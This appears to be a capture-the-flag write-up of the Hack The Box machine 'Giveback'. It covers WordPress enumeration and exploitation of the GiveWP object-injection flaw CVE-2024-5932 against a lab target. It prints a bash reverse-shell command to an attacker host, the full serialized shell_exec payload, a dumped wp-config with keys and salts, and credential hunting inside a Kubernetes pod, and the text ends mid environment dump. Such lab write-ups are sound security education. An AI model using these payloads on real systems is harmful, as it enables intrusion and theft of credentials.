---
title: Giveback [Medium]
published: false
date: 2025-10-28
tags: [htb, linux, nmap, kubernetes, wpscan, cve-2024-5932, env, ligolo-mp, wordpress, pivot, cve-2024-4577, cve-2012-1823, runc, php cgi]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/giveback-htb-season9
image: /assets/img/giveback-htb-season9/giveback-htb-season9_banner.png
---

# Giveback HTB Season 9
## Machine information
Author: [babywyrm](https://app.hackthebox.com/users/106224)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 05:42 EST
Nmap scan report for 10.129.xx.xx
Host is up (0.49s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp open  http    nginx 1.28.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
|_http-generator: WordPress 6.8.1
|_http-server-header: nginx/1.28.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.18 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.xx.xx     giveback.htb
```

From the nmap scan, we can see that the web server is running `WordPress 6.8.1` and there is a disallowed entry in the `robots.txt` file. <br>
&rarr; Gonna check it out.

### Web Enumeration
![Giveback Website Robots](/assets/img/giveback-htb-season9/giveback-htb-season9_website-robots.png)

We got `Allow` on `/wp-admin/admin-ajax.php` and `Sitemap` link as well.

![Giveback Website Sitemap](/assets/img/giveback-htb-season9/giveback-htb-season9_website-sitemap.png)

So we got 5 urls in the sitemap but nothing much to concern. <br>
&rarr; Let's go through the website.

![Giveback Website](/assets/img/giveback-htb-season9/giveback-htb-season9_website.png)

Okay, so this website is about **Donation** and we found out some endpoints.

![Giveback Website Donation Confirmation](/assets/img/giveback-htb-season9/giveback-htb-season9_website-donation-confirmation.png)

This one need to provided email to access donation history.

![Giveback Website Donation Failed](/assets/img/giveback-htb-season9/giveback-htb-season9_website-donation-failed.png)

This one nothing special as it just show when donation failed.

![Giveback Website Donation Station](/assets/img/giveback-htb-season9/giveback-htb-season9_website-donation-station.png)

From here we saw a link `http://giveback.htb/donations/the-things-we-need/` that looks interesting. <br>
&rarr; Check it out.

![Giveback Website The Things We Need](/assets/img/giveback-htb-season9/giveback-htb-season9_website-the-things-we-need.png)

![Giveback Website The Things We Need 1](/assets/img/giveback-htb-season9/giveback-htb-season9_website-the-things-we-need-1.png)

This page is where we can donate and also there is `Test Donation` as well for us to testing. <br>
&rarr; Let's try it with $100.

![Giveback Website The Things We Need 2](/assets/img/giveback-htb-season9/giveback-htb-season9_website-the-things-we-need-2.png)

We got success and at the bottom, there is check out link that back to `Donation Dashboard`.

![Giveback Website Donation Dashboard](/assets/img/giveback-htb-season9/giveback-htb-season9_website-donation-dashboard.png)

So it need to provide email to verify it so that it will allow us to access inside.

![Giveback Website Donation Dashboard Email Verify](/assets/img/giveback-htb-season9/giveback-htb-season9_website-donation-dashboard-email-verify.png)

As expected, it can not send to this email cause this email is not exist and just use for testing purpose only. <br>
Back to the website that we see there is a post on `Sep 21, 2024` just only 5s to read. <br>
&rarr; Let's get to it.

![Giveback Website Post](/assets/img/giveback-htb-season9/giveback-htb-season9_website-post.png)

![Giveback Website Post Details](/assets/img/giveback-htb-season9/giveback-htb-season9_website-post-details.png)

Nothing much as this one is posted by `babywyrm` is also the author of this machine as well. <br>
Checking the comment section, when we hover to `admin-person`.

![Giveback Website Post Comment Admin Person](/assets/img/giveback-htb-season9/giveback-htb-season9_website-post-comment-admin-person.png)

There is url that seems not related to much so we just ignore it. <br>
Up to now, we have not yet got anything to gain footage inside this machine but we know this website use `WordPress`. <br>
&rarr; We gonna try to scan it with [wpscan](https://github.com/wpscanteam/wpscan).

### WordPress
To make it gather best result, we will signup to [https://wpscan.com/profile/](https://wpscan.com/profile/) and use the free token for our enumeration.

```bash
└─$ wpscan --url http://giveback.htb/ --api-token 3axxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx --enumerate
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://giveback.htb/ [10.129.xx.xx]
[+] Started: Mon Nov  3 04:10:21 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.28.0
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://giveback.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://giveback.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.8.1 identified (Insecure, released on 2025-04-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://giveback.htb/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://giveback.htb/, Match: 'WordPress 6.8.1'
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: bizberg
 | Location: http://giveback.htb/wp-content/themes/bizberg/
 | Latest Version: 4.2.9.79 (up to date)
 | Last Updated: 2024-06-09T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/bizberg/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1
 | Style Name: Bizberg
 | Style URI: https://bizbergthemes.com/downloads/bizberg-lite/
 | Description: Bizberg is a perfect theme for your business, corporate, restaurant, ingo, ngo, environment, nature,...
 | Author: Bizberg Themes
 | Author URI: https://bizbergthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 4.2.9.79 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1, Match: 'Version: 4.2.9.79'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] give
 | Location: http://giveback.htb/wp-content/plugins/give/
 | Last Updated: 2025-10-29T20:17:00.000Z
 | [!] The version is out of date, the latest version is 4.12.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Meta Tag (Passive Detection)
 |  Javascript Var (Passive Detection)
 |
 | [!] 19 vulnerabilities identified:
 <SNIP>
 | Version: 3.14.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0
 | Confirmed By:
 |  Meta Tag (Passive Detection)
 |   - http://giveback.htb/, Match: 'Give v3.14.0'
 |  Javascript Var (Passive Detection)
 |   - http://giveback.htb/, Match: '"1","give_version":"3.14.0","magnific_options"'
<SNIP>
```

So we got lots of results that vulnerable inside plugins. <br>
At the end, we saw the confidence said that version is `3.14.0` so we will verfiy it out.

![Giveback Website The Things We Need View Source](/assets/img/giveback-htb-season9/giveback-htb-season9_website-the-things-we-need-view-source.png)

As we can see, when we view page source on this endpoint `http://giveback.htb/donations/the-things-we-need/`, we got match version plugins. <br>
&rarr; We can confirm that there are two related CVEs that we can tackle on.

```bash
<SNIP>
 | [!] 19 vulnerabilities identified:
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.14.2 - Missing Authorization to Authenticated (Subscriber+) Limited File Deletion
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/528b861e-64bf-4c59-ac58-9240db99ef96
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5941
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/824ec2ba-b701-46e9-b237-53cd7d0e46da
 |
 | [!] Title: GiveWP < 3.14.2 - Unauthenticated PHP Object Injection to RCE
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/fdf7a98b-8205-4a29-b830-c36e1e46d990
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5932
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/93e2d007-8157-42c5-92ad-704dc80749a3
<SNIP>
```

But from the result, we also saw some later version also got same vulenrable as well so if we using these two not working, we can check out the other similar exploit as well. <br>
&rarr; Taking some googling and found out this poc for [CVE-2024-5932](https://github.com/EQSTLab/CVE-2024-5932).

### CVE-2024-5932
We gonna do reverse shell.

```bash
└─$ sudo penelope -p 4545 
[+] Listening for reverse shells on 0.0.0.0:4545 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

We will use bash for our reverse one.

```bash
└─$ python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c 'bash -c "bash -i >& /dev/tcp/10.xx.xx.xx/4545 0>&1"'
                                                                                                                                                                                                                                                                                                            
             ..-+*******-                                                                                  
            .=#+-------=@.                        .:==:.                                                   
           .**-------=*+:                      .-=++.-+=:.                                                 
           +*-------=#=+++++++++=:..          -+:==**=+-+:.                                                
          .%----=+**+=-:::::::::-=+**+:.      ==:=*=-==+=..                                                
          :%--**+-::::::::::::::::::::+*=:     .::*=**=:.                                                  
   ..-++++*@#+-:::::::::::::::::::::::::-*+.    ..-+:.                                                     
 ..+*+---=#+::::::::::::::::::::::::::::::=*:..-==-.                                                       
 .-#=---**:::::::::::::::::::::::::=+++-:::-#:..            :=+++++++==.   ..-======-.     ..:---:..       
  ..=**#=::::::::::::::::::::::::::::::::::::%:.           *@@@@@@@@@@@@:.-#@@@@@@@@@%*:.-*%@@@@@@@%#=.    
   .=#%=::::::::::::::::::::::::::::::::-::::-#.           %@@@@@@@@@@@@+:%@@@@@@@@@@@%==%@@@@@@@@@@@%-    
  .*+*+:::::::::::-=-::::::::::::::::-*#*=::::#: ..*#*+:.  =++++***%@@@@+-@@@#====%@@@%==@@@#++++%@@@%-    
  .+#*-::::::::::+*-::::::::::::::::::+=::::::-#..#+=+*%-.  :=====+#@@@@-=@@@+.  .%@@@%=+@@@+.  .#@@@%-    
   .+*::::::::::::::::::::::::+*******=::::::--@.+@#+==#-. #@@@@@@@@@@@@.=@@@%*++*%@@@%=+@@@#====@@@@%-    
   .=+:::::::::::::=*+::::::-**=-----=#-::::::-@%+=+*%#:. .@@@@@@@@@@@%=.:%@@@@@@@@@@@#-=%@@@@@@@@@@@#-    
   .=*::::::::::::-+**=::::-#+--------+#:::-::#@%*==+*-   .@@@@#=----:.  .-+*#%%%%@@@@#-:+#%@@@@@@@@@#-    
   .-*::::::::::::::::::::=#=---------=#:::::-%+=*#%#-.   .@@@@%######*+.       .-%@@@#:  .....:+@@@@*:    
    :+=:::::::::::-:-::::-%=----------=#:::--%++++=**      %@@@@@@@@@@@@.        =%@@@#.        =@@@@*.    
    .-*-:::::::::::::::::**---------=+#=:::-#**#*+#*.      -#%@@@@@@@@@#.        -%@@%*.        =@@@@+.    
.::-==##**-:::-::::::::::%=-----=+***=::::=##+#=.::         ..::----:::.         .-=--.         .=+=-.     
%+==--:::=*::::::::::::-:+#**+=**=::::::-#%=:-%.                                                           
*+.......+*::::::::::::::::-****-:::::=*=:.++:*=                                                           
.%:..::::*@@*-::::::::::::::-+=:::-+#%-.   .#*#.                                                           
 ++:.....#--#%**=-:::::::::::-+**+=:@#....-+*=.                                                            
 :#:....:#-::%..-*%#++++++%@@@%*+-.#-=#+++-..                                                              
 .++....-#:::%.   .-*+-..*=.+@= .=+..-#                                                                    
 .:+++#@#-:-#= ...   .-++:-%@@=     .:#                                                                    
     :+++**##@#+=.      -%@@@%-   .-=*#.                                                                   
    .=+::+::-@:         #@@@@+. :+*=::=*-                                                                  
    .=+:-**+%%+=-:..    =*#*-..=*-:::::=*                                                                  
     :++---::--=*#+*+++++**+*+**-::::::+=                                                                  
      .+*=:::---+*:::::++++++*+=:::::-*=.                                                                  
       .:=**+====#*::::::=%:...-=++++=.      Author: EQST(Experts, Qualified Security Team)
           ..:----=**++++*+.                 Github: https://github.com/EQSTLab/CVE-2024-5932    

                                                                                                                                                                                                                                                                                                         
Analysis base : https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/

=============================================================================================================    

CVE-2024-5932 : GiveWP unauthenticated PHP Object Injection
description: The GiveWP  Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.
Arbitrary File Deletion

============================================================================================================= 
    
[\] Exploit loading, please wait...
[+] Requested Data: 
{'give-form-id': '17', 'give-form-hash': '68e9fd12f5', 'give-price-id': '0', 'give-amount': '$10.00', 'give_first': 'James', 'give_last': 'Bates', 'give_email': 'pcollins@example.com', 'give_title': 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:51:"bash -c "bash -i >& /dev/tcp/10.xx.xx.xx/4545 0>&1"";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}', 'give-gateway': 'offline', 'action': 'give_process_donation'}
```

Back to our listener.

```bash
└─$ sudo penelope -p 4545 
[+] Listening for reverse shells on 0.0.0.0:4545 →  127.0.0.1 • 172.xx.xx.xx • 172.xx.xx.xx • 10.xx.xx.xx
- 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from beta-vino-wp-wordpress-5d8ff4f68c-lwcgm~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one basic session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.xx.xx.xx:4545
[-] Failed spawning new session
[+] Interacting with session [1], Shell Type: Basic, Menu key: Ctrl-C 
[+] Logging to /home/kali/.penelope/beta-vino-wp-wordpress-5d8ff4f68c-lwcgm~10.129.xx.xx-Linux-x86_64/2025_11_03-04_37_07-490.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Got reverse shell from beta-vino-wp-wordpress-5d8ff4f68c-lwcgm~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <2>
<-5d8ff4f68c-lwcgm:/opt/bitnami/wordpress/wp-admin$id
id
uid=1001 gid=0(root) groups=0(root),1001
```

Got ourself as root but this one could be docker container.

```bash
<-54fd5798f8-hhhnq:/opt/bitnami/wordpress/wp-admin$ hostname
hostname
beta-vino-wp-wordpress-54fd5798f8-hhhnq
<-54fd5798f8-hhhnq:/opt/bitnami/wordpress/wp-admin$ df -h
df -h
Filesystem                         Size  Used Avail Use% Mounted on
overlay                             12G  8.0G  3.4G  71% /
tmpfs                               64M     0   64M   0% /dev
/dev/mapper/ubuntu--vg-ubuntu--lv   12G  8.0G  3.4G  71% /tmp
tmpfs                              1.2G   12K  1.2G   1% /secrets
shm                                 64M     0   64M   0% /dev/shm
tmpfs                              2.0G     0  2.0G   0% /proc/acpi
tmpfs                              2.0G     0  2.0G   0% /proc/scsi
tmpfs                              2.0G     0  2.0G   0% /sys/firmware
tmpfs                              2.0G     0  2.0G   0% /sys/devices/virtual/powercap
```

From this, we saw that `overlay` is Docker's default storage driver and also hostname pattern that look like Kubernetes pod naming, also that we can see `/secrets` mount. <br>
The reason we know that this is kubernetes as if we take a look closer to machine icon, we can see there is small yellow square icon so we take some searching and found out [k3s](https://github.com/k3s-io/k3s) which is `Lightweight Kubernetes`.

> *The author hint that part really good :>.*

So we go round to see if we can found any configs or things that give us way to exploit further.

```bash
<wordpress-5d8ff4f68c-lwcgm:/opt/bitnami/wordpress$ ls -la
ls -la
total 248
drwxrwsr-x  6 1001 1001  4096 Nov  2 10:43 .
drwxr-xr-x 10 root root  4096 Jun 20 08:14 ..
lrwxrwxrwx  1 1001 1001    43 Nov  2 10:42 .spdx-wordpress.json -> /opt/bitnami/wordpress/.spdx-wordpress.spdx
-rw-rw-r--  1 1001 1001  2875 Nov  2 10:42 .spdx-wordpress.spdx
-rw-rw-r--  1 1001 1001   405 Nov  2 10:42 index.php
-rw-rw-r--  1 1001 1001 19903 Nov  2 10:42 license.txt
drwxrwsr-x  2 1001 1001  4096 Nov  2 10:42 licenses
-rw-rw-r--  1 1001 1001  7425 Nov  2 10:42 readme.html
drwxrwsr-x  2 1001 1001  4096 Nov  2 10:42 tmp
-rw-rw-r--  1 1001 1001  7387 Nov  2 10:42 wp-activate.php
drwxrwsr-x  9 1001 1001  4096 Nov  2 10:42 wp-admin
-rw-rw-r--  1 1001 1001   351 Nov  2 10:42 wp-blog-header.php
-rw-rw-r--  1 1001 1001  2323 Nov  2 10:42 wp-comments-post.php
-rw-rw-r--  1 1001 1001  3336 Nov  2 10:42 wp-config-sample.php
lrwxrwxrwx  1 1001 1001    32 Nov  2 10:43 wp-config.php -> /bitnami/wordpress/wp-config.php
lrwxrwxrwx  1 1001 1001    29 Nov  2 10:43 wp-content -> /bitnami/wordpress/wp-content
-rw-rw-r--  1 1001 1001  5617 Nov  2 10:42 wp-cron.php
drwxrwsr-x 30 1001 1001 12288 Nov  2 10:42 wp-includes
-rw-rw-r--  1 1001 1001  2502 Nov  2 10:42 wp-links-opml.php
-rw-rw-r--  1 1001 1001  3937 Nov  2 10:42 wp-load.php
-rw-rw-r--  1 1001 1001 51414 Nov  2 10:42 wp-login.php
-rw-rw-r--  1 1001 1001  8727 Nov  2 10:42 wp-mail.php
-rw-rw-r--  1 1001 1001 30081 Nov  2 10:42 wp-settings.php
-rw-rw-r--  1 1001 1001 34516 Nov  2 10:42 wp-signup.php
-rw-rw-r--  1 1001 1001  5102 Nov  2 10:42 wp-trackback.php
-rw-rw-r--  1 1001 1001  3205 Nov  2 10:42 xmlrpc.php
```

We see there is `wp-config.php`. <br>
&rarr; Check it out.

```bash
<wordpress-54fd5798f8-hhhnq:/opt/bitnami/wordpress$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'bitnami_wordpress' );

/** Database username */
define( 'DB_USER', 'bn_wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'sW5xxxxxxxxxxxxxxxxxxxxx' );

/** Database hostname */
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'G7T{pv:!LZWUfekgP{A8TGFoL0,dMEU,&2B)ALoZS[8lo8V~+UGj@kWW%n^.vZgx' );
define( 'SECURE_AUTH_KEY',  'F3!hvuWAWvZw^$^|L]ONjyS{*xPHr(j,2$)!@t.(ZEn9NPNQ!A*6o6l}8@IN)>?>' );
define( 'LOGGED_IN_KEY',    'E5x5$T@Ggpti3+!/0G<>j<ylElF+}#Ny-7XZLw<#j[6|:oel9%OgxG|U}86./&&K' );
define( 'NONCE_KEY',        'jM^E^Bx{vf-Ca~2$eXbH%RzD?=VmxWP9Z}-}J1E@N]t`GOP`8;<F;lYmGz8sh7sG' );
define( 'AUTH_SALT',        '+L>`[0~bk-bRDX 5F?ER)PUnB_ ZWSId=J {5XV:trSTp0u!~6shvPS`VP{f(@_Q' );
define( 'SECURE_AUTH_SALT', 'RdhA5mNy%0~H%~s~S]a,G~;=n|)+~hZ/JWy*$GP%sAB-f>.;rcsO6.HXPvw@2q,]' );
define( 'LOGGED_IN_SALT',   'i?aJHLYu/rI%@MWZTw%Ch~%h|M/^Wum4$#4;qm(#zgQA+X3gKU?~B)@Mbgy %k}G' );
define( 'NONCE_SALT',       'Y!dylf@|OTpnNI+fC~yFTq@<}$rN)^>=+e}Q~*ez?1dnb8kF8@_{QFy^n;)gk&#q' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



define( 'FS_METHOD', 'direct' );
/**
 * The WP_SITEURL and WP_HOME options are configured to access from any hostname or IP address.
 * If you want to access only from an specific domain, you can modify them. For example:
 *  define('WP_HOME','http://example.com');
 *  define('WP_SITEURL','http://example.com');
 *
 */
if ( defined( 'WP_CLI' ) ) {
        $_SERVER['HTTP_HOST'] = '127.0.0.1';
}

define( 'WP_HOME', 'http://' . $_SERVER['HTTP_HOST'] . '/' );
define( 'WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST'] . '/' );
define( 'WP_AUTO_UPDATE_CORE', false );
/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

/**
 * Disable pingback.ping xmlrpc method to prevent WordPress from participating in DDoS attacks
 * More info at: https://docs.bitnami.com/general/apps/wordpress/troubleshooting/xmlrpc-and-pingback/
 */
if ( !defined( 'WP_CLI' ) ) {
        // remove x-pingback HTTP header
        add_filter("wp_headers", function($headers) {
                unset($headers["X-Pingback"]);
                return $headers;
        });
        // disable pingbacks
        add_filter( "xmlrpc_methods", function( $methods ) {
                unset( $methods["pingback.ping"] );
                return $methods;
        });
}
```

We found database creds.

```bash
define( 'DB_NAME', 'bitnami_wordpress' );

/** Database username */
define( 'DB_USER', 'bn_wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'sW5xxxxxxxxxxxxxxxxxxxxx' );

/** Database hostname */
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Let see if we can connect to this db.

```bash
<wordpress-54fd5798f8-hhhnq:/opt/bitnami/wordpress$ mysql -h beta-vino-wp-mariadb -u bn_wordpress -p'sW5xxxxxxxxxxxxxxxxxxxxx' bitnami_wordpress   
<ress -p'sW5xxxxxxxxxxxxxxxxxxxxx' bitnami_wordpress
mysql: Deprecated program name. It will be removed in a future release, use '/opt/bitnami/mysql/bin/mariadb' instead
```

Take while long but not yet connect from what we are doing so we gonna check the environment variables to see if we got somethings interesting.

```bash
<-5d8ff4f68c-lwcgm:/opt/bitnami/wordpress/wp-admin$ env
env
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
KUBERNETES_SERVICE_PORT_HTTPS=443
WORDPRESS_SMTP_PASSWORD=
WORDPRESS_SMTP_FROM_EMAIL=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
WEB_SERVER_HTTP_PORT_NUMBER=8080
WORDPRESS_RESET_DATA_PERMISSIONS=no
KUBERNETES_SERVICE_PORT=443
WORDPRESS_EMAIL=user@example.com
WP_CLI_CONF_FILE=/opt/bitnami/wp-cli/conf/wp-cli.yml
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
MARIADB_PORT_NUMBER=3306
MODULE=wordpress
WORDPRESS_SMTP_FROM_NAME=FirstName LastName
HOSTNAME=beta-vino-wp-wordpress-5d8ff4f68c-lwcgm
WORDPRESS_SMTP_PORT_NUMBER=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WORDPRESS_EXTRA_CLI_ARGS=
APACHE_BASE_DIR=/opt/bitnami/apache
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
APACHE_VHOSTS_DIR=/opt/bitnami/apache/conf/vhosts
WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
WORDPRESS_ENABLE_DATABASE_SSL=no
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
APACHE_DAEMON_USER=daemon
BITNAMI_ROOT_DIR=/opt/bitnami
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
WORDPRESS_BASE_DIR=/opt/bitnami/wordpress
WORDPRESS_SCHEME=http
WORDPRESS_LOGGED_IN_SALT=
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
WORDPRESS_DATA_TO_PERSIST=wp-config.php wp-content
WORDPRESS_HTACCESS_OVERRIDE_NONE=no
WORDPRESS_DATABASE_SSL_CERT_FILE=
APACHE_HTTPS_PORT_NUMBER=8443
PWD=/opt/bitnami/wordpress/wp-admin
OS_FLAVOUR=debian-12
WORDPRESS_SMTP_PROTOCOL=
WORDPRESS_CONF_FILE=/opt/bitnami/wordpress/wp-config.php
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
WP_CLI_BASE_DIR=/opt/bitnami/wp-cli
WORDPRESS_VOLUME_DIR=/bitnami/wordpress
WP_CLI_CONF_DIR=/opt/bitnami/wp-cli/conf
APACHE_BIN_DIR=/opt/bitnami/apache/bin
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
WORDPRESS_PLUGINS=none
WORDPRESS_FIRST_NAME=FirstName
MARIADB_HOST=beta-vino-wp-mariadb
WORDPRESS_EXTRA_WP_CONFIG_CONTENT=
WORDPRESS_MULTISITE_ENABLE_NIP_IO_REDIRECTION=no
WORDPRESS_DATABASE_USER=bn_wordpress
PHP_DEFAULT_UPLOAD_MAX_FILESIZE=80M
WORDPRESS_AUTH_KEY=
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_NETWORK_TYPE=subdomain
APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default
WORDPRESS_DATABASE_SSL_KEY_FILE=
WORDPRESS_LOGGED_IN_KEY=
APACHE_CONF_DIR=/opt/bitnami/apache/conf
HOME=/
